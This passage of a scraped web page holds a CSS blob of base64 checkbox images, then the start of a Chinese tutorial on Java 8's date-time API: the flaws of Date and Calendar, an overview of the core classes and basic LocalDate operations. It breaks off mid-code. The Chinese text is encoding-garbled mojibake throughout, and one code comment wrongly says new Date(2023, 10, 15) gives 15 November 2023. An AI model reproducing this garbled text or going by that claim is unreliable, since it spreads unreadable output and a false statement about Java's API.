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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å¼•è¨€ï¼šä¸ºä»€ä¹ˆéœ€è¦æ–°çš„æ—¥æœŸæ—¶é—´APIï¼Ÿ</h2>
<p>å¦‚æœä½ æ›¾ç»ä½¿ç”¨è¿‡Javaçš„<code>java.util.Date</code>å’Œ<code>java.util.Calendar</code>ï¼Œä¸€å®šä½“ä¼šè¿‡é‚£ç§æ··ä¹±å’Œç—›è‹¦ï¼šæœˆä»½ä»0å¼€å§‹ã€<code>Date</code>æ—¢åŒ…å«æ—¥æœŸåˆåŒ…å«æ—¶é—´ã€<code>SimpleDateFormat</code>çº¿ç¨‹ä¸å®‰å…¨ã€æ—¶åŒºå¤„ç†å¤æ‚... Java 8å¼•å…¥çš„å…¨æ–°æ—¥æœŸæ—¶é—´APIå½»åº•è§£å†³äº†è¿™äº›é—®é¢˜ï¼Œå¸¦æ¥äº†ç°ä»£åŒ–ã€æ˜“äºä½¿ç”¨ä¸”çº¿ç¨‹å®‰å…¨çš„æ—¶é—´å¤„ç†æ–¹å¼ã€‚</p>
<h2 data-id="heading-1">æ–°æ—§APIå¯¹æ¯”ï¼šä¸€åœºé©å‘½</h2>
<h3 data-id="heading-2">ä¼ ç»ŸAPIçš„é—®é¢˜</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.*;
<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LegacyDateTimeProblems</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// é—®é¢˜1: Dateçš„æœˆä»½ä»0å¼€å§‹ï¼ˆ0=ä¸€æœˆï¼Œ11=åäºŒæœˆï¼‰</span>
        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-number">2023</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>); <span class="hljs-comment">// è¿™å®é™…ä¸Šæ˜¯2023å¹´11æœˆ15æ—¥ï¼</span>
        System.out.println(<span class="hljs-string">"ä»¤äººå›°æƒ‘çš„æœˆä»½: "</span> + date);
        
        <span class="hljs-comment">// é—®é¢˜2: SimpleDateFormatçº¿ç¨‹ä¸å®‰å…¨</span>
        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>);
        <span class="hljs-type">Date</span> <span class="hljs-variable">parsedDate</span> <span class="hljs-operator">=</span> sdf.parse(<span class="hljs-string">"2023-11-15"</span>);
        System.out.println(<span class="hljs-string">"è§£æåçš„æ—¥æœŸ: "</span> + parsedDate);
        
        <span class="hljs-comment">// é—®é¢˜3: Calendaræ“ä½œç¹çä¸”å®¹æ˜“å‡ºé”™</span>
        <span class="hljs-type">Calendar</span> <span class="hljs-variable">calendar</span> <span class="hljs-operator">=</span> Calendar.getInstance();
        calendar.set(<span class="hljs-number">2023</span>, Calendar.NOVEMBER, <span class="hljs-number">15</span>); <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œæœˆä»½æ˜¯å®é™…çš„11æœˆ</span>
        calendar.add(Calendar.DAY_OF_MONTH, <span class="hljs-number">7</span>);
        System.out.println(<span class="hljs-string">"7å¤©å: "</span> + calendar.getTime());
        
        <span class="hljs-comment">// é—®é¢˜4: DateåŒæ—¶åŒ…å«æ—¥æœŸå’Œæ—¶é—´ï¼Œä½†ç»å¸¸è¢«è¯¯ç”¨</span>
        <span class="hljs-type">Date</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
        System.out.println(<span class="hljs-string">"DateåŒ…å«æ—¶é—´: "</span> + now);
        
        <span class="hljs-comment">// é—®é¢˜5: æ—¶åŒºå¤„ç†å¤æ‚</span>
        <span class="hljs-type">TimeZone</span> <span class="hljs-variable">tz</span> <span class="hljs-operator">=</span> TimeZone.getTimeZone(<span class="hljs-string">"America/New_York"</span>);
        calendar.setTimeZone(tz);
        System.out.println(<span class="hljs-string">"çº½çº¦æ—¶é—´: "</span> + calendar.getTime());
    }
}
</code></pre>
<h3 data-id="heading-3">Java 8æ—¥æœŸæ—¶é—´APIçš„æ ¸å¿ƒä¼˜åŠ¿</h3>
<ul>
<li><strong>ä¸å¯å˜æ€§</strong>ï¼šæ‰€æœ‰æ—¥æœŸæ—¶é—´å¯¹è±¡éƒ½æ˜¯ä¸å¯å˜çš„ï¼Œçº¿ç¨‹å®‰å…¨</li>
<li><strong>æ¸…æ™°çš„è®¾è®¡</strong>ï¼šåˆ†ç¦»äº†æ—¥æœŸã€æ—¶é—´ã€æ—¥æœŸæ—¶é—´ç­‰æ¦‚å¿µ</li>
<li><strong>æµç•…çš„API</strong>ï¼šé“¾å¼è°ƒç”¨ï¼Œä»£ç æ›´æ˜“è¯»</li>
<li><strong>å¼ºå¤§çš„æ—¶åŒºæ”¯æŒ</strong>ï¼šå†…ç½®å®Œå–„çš„æ—¶åŒºå¤„ç†</li>
<li><strong>æ›´å¥½çš„æ‰©å±•æ€§</strong>ï¼šæ”¯æŒè‡ªå®šä¹‰æ—¥å†ç³»ç»Ÿ</li>
</ul>
<h2 data-id="heading-4">æ ¸å¿ƒç±»æ¦‚è§ˆ</h2>
<pre><code class="hljs language-java" lang="java">Java <span class="hljs-number">8</span>æ—¥æœŸæ—¶é—´APIä¸»è¦ç±»ï¼š
â”œâ”€â”€ åŸºæœ¬æ—¥æœŸæ—¶é—´ç±»
â”‚   â”œâ”€â”€ LocalDate       (æ—¥æœŸï¼šå¹´-æœˆ-æ—¥)
â”‚   â”œâ”€â”€ LocalTime       (æ—¶é—´ï¼šæ—¶-åˆ†-ç§’-çº³ç§’)
â”‚   â”œâ”€â”€ LocalDateTime   (æ—¥æœŸæ—¶é—´)
â”‚   â”œâ”€â”€ ZonedDateTime   (å¸¦æ—¶åŒºçš„æ—¥æœŸæ—¶é—´)
â”‚   â””â”€â”€ OffsetDateTime  (å¸¦åç§»é‡çš„æ—¥æœŸæ—¶é—´)
â”‚
â”œâ”€â”€ æ—¶é—´ç‚¹ä¸æŒç»­æ—¶é—´
â”‚   â”œâ”€â”€ Instant         (æ—¶é—´æˆ³ï¼ŒåŸºäºUnixæ—¶é—´)
â”‚   â”œâ”€â”€ Duration        (æ—¶é—´æ®µï¼ŒåŸºäºæ—¶é—´)
â”‚   â””â”€â”€ Period          (æ—¶é—´æ®µï¼ŒåŸºäºæ—¥æœŸ)
â”‚
â”œâ”€â”€ è¾…åŠ©ç±»
â”‚   â”œâ”€â”€ DateTimeFormatter (æ—¥æœŸæ—¶é—´æ ¼å¼åŒ–)
â”‚   â”œâ”€â”€ ZoneId          (æ—¶åŒºID)
â”‚   â”œâ”€â”€ ZoneOffset      (æ—¶åŒºåç§»é‡)
â”‚   â””â”€â”€ Chronology      (å¹´è¡¨ï¼Œæ”¯æŒä¸åŒæ—¥å†ç³»ç»Ÿ)
â”‚
â””â”€â”€ æ—¶é—´è°ƒæ•´å™¨
    â”œâ”€â”€ TemporalAdjuster (æ—¶é—´è°ƒæ•´å™¨)
    â””â”€â”€ TemporalAdjusters (é¢„å®šä¹‰è°ƒæ•´å™¨)
</code></pre>
<h2 data-id="heading-5">LocalDateï¼šå¤„ç†æ—¥æœŸ</h2>
<h3 data-id="heading-6">LocalDateåŸºç¡€æ“ä½œ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.time.*;
<span class="hljs-keyword">import</span> java.time.format.*;
<span class="hljs-keyword">import</span> java.time.temporal.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalDateExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== LocalDate åŸºç¡€æ“ä½œ ==="</span>);
        
        <span class="hljs-comment">// 1. åˆ›å»ºLocalDateçš„å¤šç§æ–¹å¼</span>
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> LocalDate.now();
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">specificDate</span> <span class="hljs-operator">=</span> LocalDate.of(<span class="hljs-number">2023</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>);
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">parsedDate</span> <span class="hljs-operator">=</span> LocalDate.parse(<span class="hljs-string">"2023-11-15"</span>);
        
        System.out.println(<span class="hljs-string">"ä»Šå¤©: "</span> + today);
        System.out.println(<span class="hljs-string">"æŒ‡å®šæ—¥æœŸ: "</span> + specificDate);
        System.out.println(<span class="hljs-string">"è§£ææ—¥æœŸ: "</span> + parsedDate);
        
        <span class="hljs-comment">// 2. è·å–æ—¥æœŸå„éƒ¨åˆ†</span>
        System.out.println(<span class="hljs-string">"\næ—¥æœŸåˆ†è§£:"</span>);
        System.out.println(<span class="hljs-string">"å¹´: "</span> + today.getYear());
        System.out.println(<span class="hljs-string">"æœˆ: "</span> + today.getMonth() + <span class="hljs-string">" (æ•°å€¼: "</span> + today.getMonthValue() + <span class="hljs-string">")"</span>);
        System.out.println(<span class="hljs-string">"æ—¥: "</span> + today.getDayOfMonth());
        System.out.println(<span class="hljs-string">"æ˜ŸæœŸ: "</span> + today.getDayOfWeek());
        System.out.println(<span class="hljs-string">"ä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©: "</span> + today.getDayOfYear());
        
        <span class="hljs-comment">// 3. æ—¥æœŸè¿ç®—</span>
        System.out.println(<span class="hljs-string">"\næ—¥æœŸè¿ç®—:"</span>);
        System.out.println(<span class="hljs-string">"æ˜å¤©: "</span> + today.plusDays(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€å‘¨å: "</span> + today.plusWeeks(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€æœˆå: "</span> + today.plusMonths(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€å¹´å: "</span> + today.plusYears(<span class="hljs-number">1</span>));
        
        System.out.println(<span class="hljs-string">"æ˜¨å¤©: "</span> + today.minusDays(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€å‘¨å‰: "</span> + today.minusWeeks(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€æœˆå‰: "</span> + today.minusMonths(<span class="hljs-number">1</span>));
        System.out.println(<span class="hljs-string">"ä¸€å¹´å‰: "</span> + today.minusYears(<span class="hljs-number">1</span>));
        
        <span class="hljs-comment">// 4. æ—¥æœŸæ¯”è¾ƒ</span>
        <span class="hljs-type">LocalDate</span> <span class="hljs-variable">otherDate</span> <span class="hljs-operator">=</span> LocalDate.of(<span class="hljs-number">2023</span>, <span class="hljs-number">12</span>, <span class="hljs-number">25</span>);
        System.out.println(<span class="hljs-string">"\næ—¥æœŸæ¯”è¾ƒ:"</span>);
